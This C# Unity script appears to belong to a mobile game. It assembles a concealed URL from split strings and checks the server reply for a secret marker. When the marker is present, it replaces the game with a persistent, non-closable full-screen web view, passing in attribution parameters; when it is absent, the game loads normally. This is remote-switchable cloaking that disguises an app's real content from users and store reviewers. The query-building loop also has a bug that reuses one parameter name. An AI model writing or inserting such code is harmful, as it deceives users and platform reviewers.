using System.Collections;
using System.Collections.Generic;
using UnityEngine;
using UnityEngine.Networking;
using UnityEngine.SceneManagement;

public class MainFF : MonoBehaviour
{
    public List<string> splitters;
    [HideInInspector] public string oneFFNazva = "";
    [HideInInspector] public string twoFFNazva = "";

    [SerializeField] private string[] _subs;

    private void Awake()
    {
        if (PlayerPrefs.GetInt("idfaFF") != 0)
        {
            Application.RequestAdvertisingIdentifierAsync(
            (string advertisingId, bool trackingEnabled, string error) =>
            { oneFFNazva = advertisingId; });
        }
    }
    private void Start()
    {
        if (Application.internetReachability != NetworkReachability.NotReachable)
        {
            if (PlayerPrefs.GetString("UrlFFinquiry", string.Empty) != string.Empty)
            {
                PHASEFFVIEW(PlayerPrefs.GetString("UrlFFinquiry"));
            }
            else
            {
                foreach (string n in splitters)
                {
                    twoFFNazva += n;
                }
                StartCoroutine(IENUMENATORFF());
            }
        }
        else
        {
            StartFF();
        }
    }

    private void StartFF()
    {
        Screen.orientation = ScreenOrientation.Portrait;
        SceneManager.LoadScene("Game");
    }


    private void PHASEFFVIEW(string UrlFFinquiry, string NamingFF = "", int pix = 70)
    {
        UniWebView.SetAllowInlinePlay(true);
        var _linksFF = gameObject.AddComponent<UniWebView>();
        _linksFF.SetToolbarDoneButtonText("");
        switch (NamingFF)
        {
            case "0":
                _linksFF.SetShowToolbar(true, false, false, true);
                break;
            default:
                _linksFF.SetShowToolbar(false);
                break;
        }
        _linksFF.Frame = new Rect(0, pix, Screen.width, Screen.height - pix);
        _linksFF.OnShouldClose += (view) =>
        {
            return false;
        };
        _linksFF.SetSupportMultipleWindows(true);
        _linksFF.SetAllowBackForwardNavigationGestures(true);
        _linksFF.OnMultipleWindowOpened += (view, windowId) =>
        {
            _linksFF.SetShowToolbar(true);

        };
        _linksFF.OnMultipleWindowClosed += (view, windowId) =>
        {
            switch (NamingFF)
            {
                case "0":
                    _linksFF.SetShowToolbar(true, false, false, true);
                    break;
                default:
                    _linksFF.SetShowToolbar(false);
                    break;
            }
        };
        _linksFF.OnOrientationChanged += (view, orientation) =>
        {
            _linksFF.Frame = new Rect(0, pix, Screen.width, Screen.height - pix);
        };
        _linksFF.OnPageFinished += (view, statusCode, url) =>
        {
            if (PlayerPrefs.GetString("UrlFFinquiry", string.Empty) == string.Empty)
            {
                PlayerPrefs.SetString("UrlFFinquiry", url);
            }
        };
        _linksFF.Load(UrlFFinquiry);
        _linksFF.Show();
    }


    private IEnumerator IENUMENATORFF()
    {
        using (UnityWebRequest ff = UnityWebRequest.Get(twoFFNazva))
        {

            yield return ff.SendWebRequest();
            if (ff.isNetworkError)
            {
                StartFF();
            }
            int timetableFF = 3;
            while (PlayerPrefs.GetString("glrobo", "") == "" && timetableFF > 0)
            {
                yield return new WaitForSeconds(1);
                timetableFF--;
            }
            try
            {
                if (ff.result == UnityWebRequest.Result.Success)
                {
                    if (ff.downloadHandler.text.Contains("FlghtsFghtrsKJugxcFVW"))
                    {
                        string subs = ff.downloadHandler.text.Replace("\"", "");
                        subs += "/?";

                        foreach (KeyValuePair<string, object> entry in AppsFlyerObjectScript.DeepLinkParamsDictionary)
                        {
                            int i = 0;
                            subs += _subs[i] + "=" + entry.Value + "&";
                        }
                        subs = subs.Remove(subs.Length - 1);

                        PHASEFFVIEW(subs);
                    }
                    else
                    {
                        StartFF();
                    }
                }
                else
                {
                    StartFF();
                }
            }
            catch
            {
                StartFF();
            }
        }
    }
}
